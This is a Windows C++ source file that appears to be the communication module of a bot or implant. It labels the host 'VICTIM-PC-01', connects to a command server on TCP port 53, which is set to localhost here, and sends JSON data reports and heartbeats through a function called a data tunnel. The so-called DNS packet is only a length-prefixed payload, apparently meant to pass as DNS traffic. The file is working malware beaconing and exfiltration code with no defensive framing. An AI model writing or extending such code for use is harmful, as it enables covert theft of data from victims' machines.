#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include "Network.h"
#include "Utilities.h"
#include <iostream>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

const char* SERVER_IP = "127.0.0.1";
const int SERVER_PORT = 53;
const char* BOT_ID = "VICTIM-PC-01";
SOCKET clientSocket = INVALID_SOCKET;

std::string CreateDNSPacket(const std::string& jsonData) {
    std::string packet;
    uint32_t length = (uint32_t)jsonData.length();
    packet.append((char*)&length, 4);
    packet.append(jsonData);
    return packet;
}

bool InitializeConnection() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "WSAStartup failed" << std::endl;
        return false;
    }

    clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Socket creation failed" << std::endl;
        WSACleanup();
        return false;
    }

    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

    if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        std::cerr << "Connection failed. Error: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        WSACleanup();
        return false;
    }

    std::cout << "Connected to server on port " << SERVER_PORT << std::endl;
    return true;
}

bool SendDataTunnel(const std::string& data) {
    if (clientSocket == INVALID_SOCKET) {
        if (!InitializeConnection()) {
            return false;
        }
    }

    std::string packet = CreateDNSPacket(data);
    int result = send(clientSocket, packet.c_str(), (int)packet.length(), 0);

    if (result == SOCKET_ERROR) {
        std::cerr << "Send failed. Error: " << WSAGetLastError() << std::endl;
        closesocket(clientSocket);
        clientSocket = INVALID_SOCKET;
        return false;
    }

    std::cout << "Data sent (" << result << " bytes)" << std::endl;
    return true;
}

void SendManualInput(const std::string& content) {
    std::string jsonPacket = CreateJsonPacket("DATA_REPORT", "MANUAL", content);
    std::cout << "Sending: " << jsonPacket << std::endl;
    SendDataTunnel(jsonPacket);
}

void SendHeartbeat() {
    std::string jsonPacket = CreateJsonPacket("HEARTBEAT", "STATUS", "ONLINE");
    SendDataTunnel(jsonPacket);
}

